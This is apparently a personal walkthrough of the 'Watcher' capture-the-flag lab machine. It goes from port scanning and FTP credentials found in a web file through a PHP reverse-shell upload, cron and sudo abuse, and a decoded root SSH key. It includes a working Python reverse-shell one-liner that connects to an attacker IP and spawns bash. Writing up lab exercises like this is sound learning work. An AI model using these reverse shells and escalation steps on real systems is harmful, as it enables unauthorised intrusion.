# Box Name 
## Watcher

---

## Overview

### A boot2root Linux machine utilising web exploits along with some common privilege escalation techniques.
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---

### nmap
```bash
rustscan -a 10.10.96.128 --ulimit 9000                                       
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 9000.
Open 10.10.96.128:21
Open 10.10.96.128:22
Open 10.10.96.128:80

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

### http
- ## ferox
	```
	ferox -u http://10.10.96.128 -w /usr/share/wordlists/dirb/common.txt -t 10 -x html,txt,php -o logs/ferox.md
	
	───────────────────────────┬──────────────────────
	 🎯  Target Url            │ http://10.10.96.128
	 🚀  Threads               │ 10
	 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
	 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
	 💥  Timeout (secs)        │ 7
	 🦡  User-Agent            │ feroxbuster/1.10.3
	 💾  Output File           │ logs/ferox.md
	 💲  Extensions            │ [html, txt, php]
	 🔃  Recursion Depth       │ 4
	 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
	───────────────────────────┴──────────────────────
	 ⏯   Press [ENTER] to pause|resume your scan
	──────────────────────────────────────────────────
	200      134l      343w     4826c http://10.10.96.128/index.php
	200        3l        6w       69c http://10.10.96.128/robots.txt
	200       83l      176w     2422c http://10.10.96.128/post.php
	```
	- ### robots.txt
	```
	User-agent: *
	Allow: /flag_1.txt
	Allow: /secret_file_do_not_read.txt
	
	```
	- ### /flag1.txt
	```
	FLAG{robots_dot_text_what_is_next}
	
	```
	- ### /secret_file_do_not_read.txt
	```
	The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.
	Will
	----------
	ftpuser:givemefiles777
	
	```
### ftp
```
ftp> ls -la
229 Entering Extended Passive Mode (|||41055|)
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 ..
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
226 Directory send OK.

ftp> get flag_2.txt -
remote: flag_2.txt
229 Entering Extended Passive Mode (|||42881|)
150 Opening BINARY mode data connection for flag_2.txt (21 bytes).
FLAG{ftp_you_and_me}

```
- files dir dosn't appere to have anything in it????
---
## Initial Foothold
---

## upload a php revshell 
- Using the info we got from /home/ftpuser/ftp/files and the fact we can write to the files dir in ftp
	```
	ftp> put shell.php
	local: shell.php remote: shell.php
	229 Entering Extended Passive Mode (|||46415|)
	150 Ok to send data.
	100% |**************************************************************************|  3462       32.36 MiB/s    00:00 ETA
	226 Transfer complete.
	3462 bytes sent in 00:00 (12.01 KiB/s)
	ftp> ls -la
	229 Entering Extended Passive Mode (|||45780|)
	150 Here comes the directory listing.
	drwxr-xr-x    2 1001     1001         4096 Mar 06 18:52 .
	dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 ..
	-rw-r--r--    1 1001     1001         3462 Mar 06 18:52 shell.php
	226 Directory send OK.
	
	```

- ## on the box
	- ### Enumeration
	```
	www-data@watcher:/home$ find / -type f -iname flag_*.txt 2>/dev/null
	/home/mat/flag_5.txt
	/home/ftpuser/ftp/flag_2.txt
	/home/will/flag_6.txt
	/home/toby/flag_4.txt
	/var/www/html/more_secrets_a9f10a/flag_3.txt
	/var/www/html/flag_1.txt
	
	```
	- ### cat flag_6.txt
	```
	www-data@watcher:/home$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt
	FLAG{lfi_what_a_guy}
	```
- ## linpeas toby
```
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs

*/1 * * * * mat /home/toby/jobs/cow.sh

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL

```
## Privilege Escalation

- ## sudo -u toby bash
	- cat flag_4.txt
	```bash
	toby@watcher:~$ cat flag_4.txt 
	FLAG{chad_lifestyle}
	```

- ## edit cow.sh
	- edit cow.sh with a [[revshell]] and wait for cron job to get shell as mat
	- cat flag_5.txt
	```bash
	mat@watcher:~$ cat flag_5.txt
	FLAG{live_by_the_cow_die_by_the_cow}
	```

- ## linpeas mat
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for mat on watcher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mat may run the following commands on watcher:
    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py

```

- ## cat /home/mat/scripts/will_script.py
	```python
	mat@watcher:/tmp$ cat /home/mat/scripts/will_script.py
	import os
	import sys
	from cmd import get_command
	
	cmd = get_command(sys.argv[1])
	
	whitelist = ["ls -lah", "id", "cat /etc/passwd"]
	
	if cmd not in whitelist:
		print("Invalid command!")
		exit()
	
	os.system(cmd)
	
	```
	- ## cat /home/mat/scripts/cmd.py

```python
mat@watcher:/tmp$ cat /home/mat/scripts/cmd.py 
def get_command(num):
	if(num == "1"):
		return "ls -lah"
	if(num == "2"):
		return "id"
	if(num == "3"):
		return "cat /etc/passwd"

```
- ### edit cmd.py
	- use python oneliner[[revshell]] at the beginig of the script
	```python
	import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.9.223",1236));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"])

	```
- ## cat flag_6.txt
```bash

will@watcher:/home/will$ cat flag_6.txt 
FLAG{but_i_thought_my_script_was_secure}
```

- ## linpeas will
```
╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
  Group will:
/home/will/.config/lxc/config.yml
  Group adm:
/opt/backups
/opt/backups/key.b64
```

- ### decode /opt/backups/key.b64
	- you get roots id_rsa key
	- copy key to my attacking machine
	- ssh in as root #ssh

```bash
ssh -i root_id_rsa root@10.10.96.128        
The authenticity of host '10.10.96.128 (10.10.96.128)' can't be established.
ED25519 key fingerprint is SHA256:/60sf9gTocupkmAaJjtQJTxW1ZnolBZckE6KpPiQi5s.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.96.128' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Mar  6 20:32:57 UTC 2022

  System load:  0.08               Processes:             122
  Usage of /:   23.5% of 18.57GB   Users logged in:       0
  Memory usage: 40%                IP address for eth0:   10.10.96.128
  Swap usage:   0%                 IP address for lxdbr0: 10.14.179.1


33 packages can be updated.
0 updates are security updates.


Last login: Thu Dec  3 03:25:38 2020
root@watcher:~# 

```

- ## cat flag_7.txt

```bash
root@watcher:~# cat flag_7.txt 
FLAG{who_watches_the_watchers}
```
----
